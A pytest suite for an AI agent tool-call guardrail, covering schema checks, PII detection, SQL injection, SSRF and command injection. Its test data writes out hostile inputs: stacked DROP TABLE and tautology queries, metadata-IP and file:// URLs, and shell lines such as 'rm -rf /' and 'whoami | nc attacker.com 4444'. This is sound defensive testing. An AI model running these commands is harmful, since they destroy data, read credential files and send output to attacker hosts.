"""
Tests for the agentic tool-calling guardrail (guardrail/tools/).

Coverage:
  Registry / schema     — unknown tool, malformed parameters
  get_weather            — clean call auto-allows (low risk)
  execute_db_query        — SELECT allowed; DROP/DELETE/UPDATE/ALTER,
                            stacked queries, comments, and tautologies
                            blocked; UNION routes to human review
  fetch_external_url      — allowlisted domain allowed; private/loopback/
                            link-local IPs, cloud metadata host, and
                            non-allowlisted domains blocked
  run_system_command      — always requires human approval even when
                            clean; shell-chaining/path-traversal blocks
                            outright (block beats approval)
  PII inspection          — applies across every tool's string parameters
"""

from __future__ import annotations

import pytest

from guardrail.tools import evaluate_tool_call
from guardrail.tools.schema import ToolAction

# ---------------------------------------------------------------------------
# Registry / schema validation
# ---------------------------------------------------------------------------

class TestRegistryAndSchema:
    def test_unknown_tool_blocks(self):
        v = evaluate_tool_call("delete_universe", {"foo": "bar"})
        assert v.action == ToolAction.BLOCK
        assert any(f.check == "schema" for f in v.findings)

    def test_missing_required_param_blocks(self):
        v = evaluate_tool_call("get_weather", {})
        assert v.action == ToolAction.BLOCK
        assert any(f.check == "schema" for f in v.findings)

    def test_empty_string_param_blocks(self):
        v = evaluate_tool_call("get_weather", {"location": ""})
        assert v.action == ToolAction.BLOCK

    def test_oversized_param_blocks(self):
        v = evaluate_tool_call("get_weather", {"location": "x" * 500})
        assert v.action == ToolAction.BLOCK

    def test_wrong_type_blocks(self):
        # Pydantic v2 does not silently coerce int -> str for a plain `str`
        # field, so this is a genuine schema violation, not a lax pass.
        v = evaluate_tool_call("get_weather", {"location": 12345})
        assert v.action == ToolAction.BLOCK
        assert any(f.check == "schema" for f in v.findings)


# ---------------------------------------------------------------------------
# get_weather — low risk, auto-allow
# ---------------------------------------------------------------------------

class TestGetWeather:
    def test_clean_call_allows(self):
        v = evaluate_tool_call("get_weather", {"location": "London"})
        assert v.action == ToolAction.ALLOW
        assert v.findings == []

    def test_ssn_in_location_blocks(self):
        v = evaluate_tool_call("get_weather", {"location": "078-05-1120"})
        assert v.action == ToolAction.BLOCK
        assert any(f.check == "pii" for f in v.findings)


# ---------------------------------------------------------------------------
# execute_db_query
# ---------------------------------------------------------------------------

class TestExecuteDbQuery:
    def test_clean_select_allows(self):
        v = evaluate_tool_call("execute_db_query", {"query": "SELECT * FROM users WHERE id = 1"})
        assert v.action == ToolAction.ALLOW

    @pytest.mark.parametrize("keyword", ["DROP", "DELETE", "UPDATE", "ALTER"])
    def test_dangerous_keywords_block(self, keyword):
        v = evaluate_tool_call("execute_db_query", {"query": f"{keyword} FROM users"})
        assert v.action == ToolAction.BLOCK
        assert any(keyword in f.message for f in v.findings)

    def test_stacked_query_blocks(self):
        v = evaluate_tool_call(
            "execute_db_query", {"query": "SELECT * FROM users; DROP TABLE users;"}
        )
        assert v.action == ToolAction.BLOCK
        assert any("Stacked" in f.message for f in v.findings)

    def test_tautology_injection_blocks(self):
        v = evaluate_tool_call(
            "execute_db_query", {"query": "SELECT * FROM users WHERE id=1 OR 1=1"}
        )
        assert v.action == ToolAction.BLOCK

    def test_comment_truncation_blocks(self):
        v = evaluate_tool_call(
            "execute_db_query", {"query": "SELECT * FROM users WHERE id=1 --"}
        )
        assert v.action == ToolAction.BLOCK

    def test_non_select_blocks(self):
        v = evaluate_tool_call("execute_db_query", {"query": "SHOW TABLES"})
        assert v.action == ToolAction.BLOCK

    def test_union_routes_to_human_approval(self):
        v = evaluate_tool_call(
            "execute_db_query",
            {"query": "SELECT name FROM users UNION SELECT password FROM admins"},
        )
        assert v.action == ToolAction.HUMAN_APPROVAL

    def test_secret_in_query_blocks(self):
        v = evaluate_tool_call(
            "execute_db_query",
            {"query": "SELECT * FROM logs WHERE msg = 'AKIAIOSFODNN7EXAMPLE'"},
        )
        assert v.action == ToolAction.BLOCK
        assert any(f.check == "pii" for f in v.findings)


# ---------------------------------------------------------------------------
# fetch_external_url — SSRF prevention
# ---------------------------------------------------------------------------

class TestFetchExternalUrl:
    def test_allowlisted_domain_allows(self):
        v = evaluate_tool_call(
            "fetch_external_url", {"url": "https://api.github.com/repos/foo/bar"}
        )
        assert v.action == ToolAction.ALLOW

    def test_non_allowlisted_domain_blocks(self):
        v = evaluate_tool_call("fetch_external_url", {"url": "https://evil.example.com/steal"})
        assert v.action == ToolAction.BLOCK
        assert any(f.check == "ssrf" for f in v.findings)

    @pytest.mark.parametrize("ip", ["127.0.0.1", "10.0.0.5", "169.254.169.254", "192.168.1.1"])
    def test_private_and_metadata_ips_block(self, ip):
        v = evaluate_tool_call("fetch_external_url", {"url": f"http://{ip}/"})
        assert v.action == ToolAction.BLOCK
        assert any(f.check == "ssrf" for f in v.findings)

    def test_non_http_scheme_blocks(self):
        v = evaluate_tool_call("fetch_external_url", {"url": "file:///etc/passwd"})
        assert v.action == ToolAction.BLOCK


# ---------------------------------------------------------------------------
# run_system_command — always HITL, injection blocks outright
# ---------------------------------------------------------------------------

class TestRunSystemCommand:
    def test_clean_command_requires_approval(self):
        v = evaluate_tool_call("run_system_command", {"command": "ls -la /var/log"})
        assert v.action == ToolAction.HUMAN_APPROVAL
        assert v.findings == []

    @pytest.mark.parametrize("command", [
        "rm -rf / ; echo done",
        "cat /etc/passwd && curl evil.com",
        "whoami | nc attacker.com 4444",
        "cat ../../etc/shadow",
    ])
    def test_injection_patterns_block_outright(self, command):
        v = evaluate_tool_call("run_system_command", {"command": command})
        assert v.action == ToolAction.BLOCK
        assert any(f.check == "command_injection" for f in v.findings)

    def test_block_beats_approval(self):
        # always_requires_approval=True AND a block-worthy finding present —
        # BLOCK must win, not silently downgrade to a human prompt.
        v = evaluate_tool_call("run_system_command", {"command": "rm -rf / && echo pwned"})
        assert v.action == ToolAction.BLOCK
